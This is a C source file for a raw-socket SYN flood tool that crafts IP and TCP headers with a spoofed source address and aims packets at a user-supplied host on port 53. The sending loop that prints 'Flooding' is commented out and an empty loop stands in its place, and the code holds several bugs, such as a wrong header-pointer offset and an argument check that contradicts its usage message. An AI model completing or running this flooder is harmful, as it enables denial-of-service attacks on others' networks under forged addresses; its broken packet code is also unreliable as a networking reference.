#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

struct ipheader {
    unsigned char iph_ihl: 5, /* Little-endian */
        iph_ver: 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned char iph_flags;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    unsigned int iph_sourceip;
    unsigned int iph_destip;
};


struct tcpheader {
    unsigned short int tcph_srcport;
    unsigned short int tcph_destport;
    unsigned int tcph_seqnum;
    unsigned int tcph_acknum;
    unsigned char tcph_reserved: 4, tcph_offset: 4;
    unsigned int
    tcp_res1: 4, /*little-endian*/
        tcph_hlen: 4, /*length of tcp header in 32-bit words*/
        tcph_fin: 1, /*Finish flag "fin"*/
        tcph_syn: 1, /*Synchronize sequence numbers to start a connection*/
        tcph_rst: 1, /*Reset flag */
        tcph_psh: 1, /*Push, sends data to the application*/
        tcph_ack: 1, /*acknowledge*/
        tcph_urg: 1, /*urgent pointer*/
        tcph_res2: 2;
    unsigned short int tcph_win;
    unsigned short int tcph_chksum;
    unsigned short int tcph_urgptr;
};

unsigned short csum(unsigned short * buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += * buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char * argv[]) {
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096];
    struct ipheader * iph = (struct ipheader * ) datagram;
    struct tcpheader * tcph = (struct tcpheader * ) datagram + sizeof(struct ipheader);
    struct sockaddr_in sin;
    if (argc != 2) {
        printf("Invalid parameters!\n");
        printf("Usage: %s <target IP/hostname> <port to be flooded>\n", argv[0]);
        exit(-1);
    }
    unsigned int floodport = 53;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    memset(datagram, 0, 4096);
    iph -> iph_ihl = 5;
    iph -> iph_ver = 4;
    iph -> iph_tos = 0;
    iph -> iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
    iph -> iph_ident = htonl(54321);
    iph -> iph_offset = 0;
    iph -> iph_ttl = 255;
    iph -> iph_protocol = 6; // upper layer protocol, TCP
    iph -> iph_chksum = 0;
    iph -> iph_sourceip = inet_addr("192.168.3.100");
    iph -> iph_destip = sin.sin_addr.s_addr;
    tcph -> tcph_srcport = htons(5678);
    tcph -> tcph_destport = htons(floodport);
    tcph -> tcph_seqnum = random();
    tcph -> tcph_acknum = 0;
    tcph -> tcph_res2 = 0;
    tcph -> tcph_offset = 0;
    tcph -> tcph_syn = 0x02;
    tcph -> tcph_win = htonl(65535);
    tcph -> tcph_chksum = 0;
    tcph -> tcph_urgptr = 0;
    iph -> iph_chksum = csum((unsigned short * ) datagram, iph -> iph_len >> 1);

    int tmp = 1;
    const int * val = & tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
        printf("Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
    else
        printf("OK, using your own header!\n");
    for (int i=0; i<100; i++){
        for (int j=0; j<1000; j++){


        }


    }
    /*while (1) {
        if (sendto(s, datagram, iph -> iph_len, 0, (struct sockaddr * ) & sin, sizeof(sin)) < 0)
            printf("sendto() error!!!.\n");
        else
            printf("Flooding %s at %u...\n", argv[1], floodport);
    }*/
    return 0;
}